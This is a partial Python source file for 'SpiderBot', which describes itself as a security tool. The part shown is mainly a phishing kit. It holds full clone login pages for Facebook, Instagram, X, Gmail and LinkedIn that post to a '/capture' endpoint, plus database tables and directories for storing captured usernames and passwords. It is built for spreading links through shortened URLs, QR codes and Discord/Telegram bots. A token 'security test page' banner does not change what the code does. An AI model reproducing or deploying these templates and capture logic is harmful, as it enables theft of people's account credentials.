#!/usr/bin/env python3
"""
🕸️SPIDER BOT v17.0.0
Author: Ian Carter Kulani
Version: v17.0.0
Description: SpiderBot cybersecurity tool with 500+ commands, 
            social engineering capabilities, phishing link generation,
            Discord/Telegram integration, advanced monitoring,
            and comprehensive network analysis
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
import shutil
import urllib.parse
import asyncio
import uuid

# Optional imports with fallbacks
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False
    print("⚠️ Warning: discord.py not available. Install with: pip install discord.py")

try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False
    print("⚠️ Warning: telethon not available. Install with: pip install telethon")

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False
    print("⚠️ Warning: whois not available. Install with: pip install python-whois")

try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    print("⚠️ Warning: colorama not available. Install with: pip install colorama")

# For QR code generation
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False
    print("⚠️ Warning: qrcode not available. Install with: pip install qrcode[pil]")

# For URL shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False
    print("⚠️ Warning: pyshorteners not available. Install with: pip install pyshorteners")

# For web server
try:
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import socketserver
    HTTP_SERVER_AVAILABLE = True
except ImportError:
    HTTP_SERVER_AVAILABLE = False

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".spiderbot_pro"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
TELEGRAM_CONFIG_FILE = os.path.join(CONFIG_DIR, "telegram_config.json")
DISCORD_CONFIG_FILE = os.path.join(CONFIG_DIR, "discord_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "network_data.db")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
LOG_FILE = os.path.join(CONFIG_DIR, "spiderbot.log")
REPORT_DIR = "reports"
SCAN_RESULTS_DIR = "scan_results"
ALERTS_DIR = "alerts"
MONITORING_DIR = "monitoring"
BACKUPS_DIR = "backups"
TEMP_DIR = "temp"
SCRIPTS_DIR = "scripts"
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
PHISHING_LOGS_DIR = os.path.join(CONFIG_DIR, "phishing_logs")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")

# Create directories
directories = [
    CONFIG_DIR, REPORT_DIR, SCAN_RESULTS_DIR, ALERTS_DIR,
    MONITORING_DIR, BACKUPS_DIR, TEMP_DIR, SCRIPTS_DIR,
    PHISHING_DIR, PHISHING_TEMPLATES_DIR, PHISHING_LOGS_DIR,
    CAPTURED_CREDENTIALS_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("SpiderBotPro")

# Color setup
if COLORAMA_AVAILABLE:
    class Colors:
        RED = Fore.RED + Style.BRIGHT
        GREEN = Fore.GREEN + Style.BRIGHT
        YELLOW = Fore.YELLOW + Style.BRIGHT
        BLUE = Fore.BLUE + Style.BRIGHT
        CYAN = Fore.CYAN + Style.BRIGHT
        MAGENTA = Fore.MAGENTA + Style.BRIGHT
        WHITE = Fore.WHITE + Style.BRIGHT
        RESET = Style.RESET_ALL
else:
    class Colors:
        RED = GREEN = YELLOW = BLUE = CYAN = MAGENTA = WHITE = RESET = ""

# =====================
# DATA CLASSES & ENUMS
# =====================
class ScanType:
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    VULNERABILITY = "vulnerability"
    FULL = "full"
    UDP = "udp"
    OS_DETECTION = "os_detection"
    SERVICE_DETECTION = "service_detection"

class Severity:
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class PhishingPlatform:
    FACEBOOK = "facebook"
    INSTAGRAM = "instagram"
    TWITTER = "twitter"
    LINKEDIN = "linkedin"
    GMAIL = "gmail"
    CUSTOM = "custom"

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class ScanResult:
    target: str
    scan_type: str
    open_ports: List[Dict]
    timestamp: str
    success: bool
    error: Optional[str] = None

@dataclass
class PhishingLink:
    id: str
    platform: str
    original_url: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0
    captured_credentials: List[Dict] = None
    
    def __post_init__(self):
        if self.captured_credentials is None:
            self.captured_credentials = []

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    """Configuration manager"""
    
    DEFAULT_CONFIG = {
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "udp_flood_threshold": 500,
            "http_flood_threshold": 200,
            "ddos_threshold": 1000
        },
        "scanning": {
            "default_ports": "1-1000",
            "timeout": 30,
            "rate_limit": False
        },
        "security": {
            "auto_block": False,
            "log_level": "INFO",
            "backup_enabled": True
        },
        "social_engineering": {
            "enabled": True,
            "default_domain": "localhost",
            "default_port": 8080,
            "use_https": False,
            "capture_credentials": True,
            "log_all_requests": True,
            "auto_shorten_urls": True
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!"
        },
        "telegram": {
            "enabled": False,
            "api_id": "",
            "api_hash": "",
            "phone_number": "",
            "channel_id": ""
        }
    }
    
    @staticmethod
    def load_config() -> Dict:
        """Load configuration"""
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    # Merge with defaults
                    for key, value in ConfigManager.DEFAULT_CONFIG.items():
                        if key not in config:
                            config[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in config[key]:
                                    config[key][sub_key] = sub_value
                    return config
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        
        return ConfigManager.DEFAULT_CONFIG.copy()
    
    @staticmethod
    def save_config(config: Dict) -> bool:
        """Save configuration"""
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            logger.info("Configuration saved")
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False
    
    @staticmethod
    def save_telegram_config(config: Dict) -> bool:
        """Save Telegram configuration"""
        try:
            with open(TELEGRAM_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save Telegram config: {e}")
            return False
    
    @staticmethod
    def load_telegram_config() -> Dict:
        """Load Telegram configuration"""
        try:
            if os.path.exists(TELEGRAM_CONFIG_FILE):
                with open(TELEGRAM_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Telegram config: {e}")
        return {}
    
    @staticmethod
    def save_discord_config(config: Dict) -> bool:
        """Save Discord configuration"""
        try:
            with open(DISCORD_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save Discord config: {e}")
            return False
    
    @staticmethod
    def load_discord_config() -> Dict:
        """Load Discord configuration"""
        try:
            if os.path.exists(DISCORD_CONFIG_FILE):
                with open(DISCORD_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Discord config: {e}")
        return {}

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """SQLite database manager"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        """Initialize database tables"""
        tables = [
            # Command history
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            
            # Threat alerts
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            
            # Scan results
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                services TEXT,
                os_info TEXT,
                execution_time REAL
            )
            """,
            
            # Monitored IPs
            """
            CREATE TABLE IF NOT EXISTS monitored_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT 1,
                threat_level INTEGER DEFAULT 0,
                last_scan TIMESTAMP,
                notes TEXT
            )
            """,
            
            # System metrics
            """
            CREATE TABLE IF NOT EXISTS system_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER
            )
            """,
            
            # Phishing links
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                original_url TEXT,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1,
                qr_code_path TEXT
            )
            """,
            
            # Captured credentials
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                additional_data TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            
            # Phishing templates
            """
            CREATE TABLE IF NOT EXISTS phishing_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                platform TEXT NOT NULL,
                html_content TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )
            """
        ]
        
        for table_sql in tables:
            self.cursor.execute(table_sql)
        
        self.conn.commit()
        
        # Insert default phishing templates
        self._init_phishing_templates()
    
    def _init_phishing_templates(self):
        """Initialize default phishing templates"""
        templates = {
            "facebook_default": {
                "platform": "facebook",
                "html": self._get_facebook_template()
            },
            "instagram_default": {
                "platform": "instagram",
                "html": self._get_instagram_template()
            },
            "twitter_default": {
                "platform": "twitter",
                "html": self._get_twitter_template()
            },
            "gmail_default": {
                "platform": "gmail",
                "html": self._get_gmail_template()
            },
            "linkedin_default": {
                "platform": "linkedin",
                "html": self._get_linkedin_template()
            }
        }
        
        for name, template in templates.items():
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO phishing_templates (name, platform, html_content)
                    VALUES (?, ?, ?)
                ''', (name, template['platform'], template['html']))
            except Exception as e:
                logger.error(f"Failed to insert template {name}: {e}")
        
        self.conn.commit()
    
    def _get_facebook_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo h1 {
            color: #1877f2;
            font-size: 40px;
            margin: 0;
        }
        .form-group {
            margin-bottom: 15px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 14px 16px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background-color: #166fe5;
        }
        .forgot-password {
            text-align: center;
            margin-top: 16px;
        }
        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .forgot-password a:hover {
            text-decoration: underline;
        }
        .signup-link {
            text-align: center;
            margin-top: 20px;
            border-top: 1px solid #dadde1;
            padding-top: 20px;
        }
        .signup-link a {
            background-color: #42b72a;
            color: white;
            padding: 14px 16px;
            border-radius: 6px;
            text-decoration: none;
            font-weight: bold;
            font-size: 17px;
        }
        .signup-link a:hover {
            background-color: #36a420;
        }
        .warning {
            margin-top: 20px;
            padding: 10px;
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 4px;
            color: #856404;
            text-align: center;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>facebook</h1>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Email or phone number" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Log In</button>
                <div class="forgot-password">
                    <a href="#">Forgotten account?</a>
                </div>
            </form>
            <div class="signup-link">
                <a href="#">Create new account</a>
            </div>
            <div class="warning">
                ⚠️ This is a security test page. Do not enter real credentials.
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_instagram_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Instagram • Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 350px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 30px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            font-family: 'Billabong', cursive;
            font-size: 50px;
            margin: 0;
            color: #262626;
        }
        .form-group {
            margin-bottom: 10px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 9px 8px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            box-sizing: border-box;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #a8a8a8;
            outline: none;
        }
        button {
            width: 100%;
            padding: 7px 16px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 8px;
        }
        button:hover {
            background-color: #1877f2;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .divider-line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .divider-text {
            margin: 0 18px;
            color: #8e8e8e;
            font-weight: 600;
            font-size: 13px;
        }
        .forgot-password {
            text-align: center;
            margin-top: 12px;
        }
        .forgot-password a {
            color: #00376b;
            text-decoration: none;
            font-size: 12px;
        }
        .forgot-password a:hover {
            text-decoration: underline;
        }
        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            margin-top: 10px;
            text-align: center;
        }
        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        .warning {
            margin-top: 20px;
            padding: 10px;
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 4px;
            color: #856404;
            text-align: center;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>Instagram</h1>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Log In</button>
                <div class="divider">
                    <div class="divider-line"></div>
                    <div class="divider-text">OR</div>
                    <div class="divider-line"></div>
                </div>
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
            </form>
        </div>
        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
        <div class="warning">
            ⚠️ This is a security test page. Do not enter real credentials.
        </div>
    </div>
</body>
</html>"""
    
    def _get_twitter_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>X / Twitter</title>
    <style>
        body {
            font-family: 'TwitterChirp', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #000000;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #e7e9ea;
        }
        .container {
            max-width: 600px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: #000000;
            border: 1px solid #2f3336;
            border-radius: 16px;
            padding: 48px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            font-size: 40px;
            margin: 0;
            color: #e7e9ea;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            background-color: #000000;
            border: 1px solid #2f3336;
            border-radius: 4px;
            color: #e7e9ea;
            font-size: 16px;
            box-sizing: border-box;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #1d9bf0;
            outline: none;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #1d9bf0;
            color: white;
            border: none;
            border-radius: 9999px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background-color: #1a8cd8;
        }
        .links {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }
        .links a {
            color: #1d9bf0;
            text-decoration: none;
            font-size: 14px;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .warning {
            margin-top: 20px;
            padding: 12px;
            background-color: #1a1a1a;
            border: 1px solid #2f3336;
            border-radius: 8px;
            color: #e7e9ea;
            text-align: center;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>𝕏</h1>
                <h2>Sign in to X</h2>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Phone, email, or username" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Next</button>
                <div class="links">
                    <a href="#">Forgot password?</a>
                    <a href="#">Sign up with X</a>
                </div>
            </form>
            <div class="warning">
                ⚠️ This is a security test page. Do not enter real credentials.
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_gmail_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Gmail</title>
    <style>
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background-color: #f0f4f9;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 450px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            border-radius: 28px;
            padding: 48px 40px 36px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #1a73e8;
            font-size: 24px;
            margin: 10px 0 0;
        }
        .logo svg {
            width: 75px;
            height: 24px;
        }
        h2 {
            font-size: 24px;
            font-weight: 400;
            margin: 0 0 10px;
        }
        .subtitle {
            color: #202124;
            font-size: 16px;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #1a73e8;
            outline: none;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        button {
            width: 100%;
            padding: 13px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background-color: #1b66c9;
        }
        .links {
            margin-top: 30px;
            text-align: center;
        }
        .links a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            margin: 0 10px;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .warning {
            margin-top: 30px;
            padding: 12px;
            background-color: #e8f0fe;
            border: 1px solid #d2e3fc;
            border-radius: 8px;
            color: #202124;
            text-align: center;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <svg viewBox="0 0 75 24" width="75" height="24">
                    <path fill="#4285F4" d="M45.09 7.98l-2.14 1.58c-.44-.67-1.12-1.08-2.08-1.08-1.44 0-2.46 1.11-2.46 2.64 0 1.53 1.02 2.64 2.46 2.64.96 0 1.64-.41 2.08-1.08l2.14 1.58c-.94 1.28-2.4 1.96-4.22 1.96-2.98 0-5.15-2.1-5.15-5.1 0-3 2.17-5.1 5.15-5.1 1.82 0 3.28.68 4.22 1.96z"/>
                    <path fill="#EA4335" d="M61 4.76v8.48h-2.63V5.64h-2.19V4.76h4.82z"/>
                    <path fill="#FBBC05" d="M24 4.76v8.48h-2.63V5.64h-2.19V4.76h4.82z"/>
                    <path fill="#4285F4" d="M42.02 4.76v8.48h-2.63V5.64h-2.19V4.76h4.82z"/>
                    <path fill="#34A853" d="M52.1 4.76v8.48h-2.63V5.64h-2.19V4.76h4.82z"/>
                </svg>
                <h1>Gmail</h1>
            </div>
            <h2>Sign in</h2>
            <div class="subtitle">to continue to Gmail</div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Email or phone" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Next</button>
                <div class="links">
                    <a href="#">Create account</a>
                    <a href="#">Forgot email?</a>
                </div>
            </form>
            <div class="warning">
                ⚠️ This is a security test page. Do not enter real credentials.
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_linkedin_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>LinkedIn Login</title>
    <style>
        body {
            font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', 'Fira Sans', Ubuntu, Oxygen, 'Oxygen Sans', Cantarell, 'Droid Sans', 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Lucida Grande', Helvetica, Arial, sans-serif;
            background-color: #f3f2f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            border-radius: 8px;
            padding: 40px 32px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo h1 {
            color: #0a66c2;
            font-size: 32px;
            margin: 0;
        }
        h2 {
            font-size: 24px;
            font-weight: 600;
            margin: 0 0 8px;
            color: #000000;
        }
        .subtitle {
            color: #666666;
            font-size: 14px;
            margin-bottom: 24px;
        }
        .form-group {
            margin-bottom: 16px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px;
            border: 1px solid #666666;
            border-radius: 4px;
            font-size: 14px;
            box-sizing: border-box;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #0a66c2;
            outline: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #0a66c2;
            color: white;
            border: none;
            border-radius: 28px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            margin-top: 8px;
        }
        button:hover {
            background-color: #004182;
        }
        .forgot-password {
            text-align: center;
            margin-top: 16px;
        }
        .forgot-password a {
            color: #0a66c2;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
        }
        .forgot-password a:hover {
            text-decoration: underline;
        }
        .signup-link {
            text-align: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e0e0e0;
        }
        .signup-link a {
            color: #0a66c2;
            text-decoration: none;
            font-weight: 600;
        }
        .warning {
            margin-top: 24px;
            padding: 12px;
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 4px;
            color: #856404;
            text-align: center;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>LinkedIn</h1>
            </div>
            <h2>Sign in</h2>
            <div class="subtitle">Stay updated on your professional world</div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Email or phone number" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Sign in</button>
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
            </form>
            <div class="signup-link">
                New to LinkedIn? <a href="#">Join now</a>
            </div>
            <div class="warning">
                ⚠️ This is a security test page. Do not enter real credentials.
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def log_command(self, command: str, source: str = "local", success: bool = True,
                   output: str = "", execution_time: float = 0.0):
        """Log command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_threat(self, alert: ThreatAlert):
        """Log threat alert"""
        try:
            self.cursor.execute('''
                INSERT INTO threats (timestamp, threat_type, source_ip, severity, description, action_taken)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (alert.timestamp, alert.threat_type, alert.source_ip,
                  alert.severity, alert.description, alert.action_taken))
            self.conn.commit()
            logger.info(f"Threat logged: {alert.threat_type} from {alert.source_ip}")
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def log_scan(self, scan_result: ScanResult):
        """Log scan results"""
        try:
            open_ports_json = json.dumps(scan_result.open_ports) if scan_result.open_ports else "[]"
            self.cursor.execute('''
                INSERT INTO scans (target, scan_type, open_ports, timestamp)
                VALUES (?, ?, ?, ?)
            ''', (scan_result.target, scan_result.scan_type, open_ports_json, scan_result.timestamp))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log scan: {e}")
    
    def add_monitored_ip(self, ip: str, notes: str = "") -> bool:
        """Add IP to monitoring"""
        try:
            self.cursor.execute('''
                INSERT OR IGNORE INTO monitored_ips (ip_address, notes) VALUES (?, ?)
            ''', (ip, notes))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add monitored IP: {e}")
            return False
    
    def get_monitored_ips(self, active_only: bool = True) -> List[Dict]:
        """Get monitored IPs"""
        try:
            if active_only:
                self.cursor.execute('''
                    SELECT * FROM monitored_ips WHERE is_active = 1 ORDER BY added_date DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM monitored_ips ORDER BY added_date DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get monitored IPs: {e}")
            return []
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        """Get recent threats"""
        try:
            self.cursor.execute('''
                SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        """Get command history"""
        try:
            self.cursor.execute('''
                SELECT command, source, timestamp, success FROM command_history 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        stats = {}
        try:
            # Count threats
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            
            # Count commands
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            
            # Count scans
            self.cursor.execute('SELECT COUNT(*) FROM scans')
            stats['total_scans'] = self.cursor.fetchone()[0]
            
            # Count monitored IPs
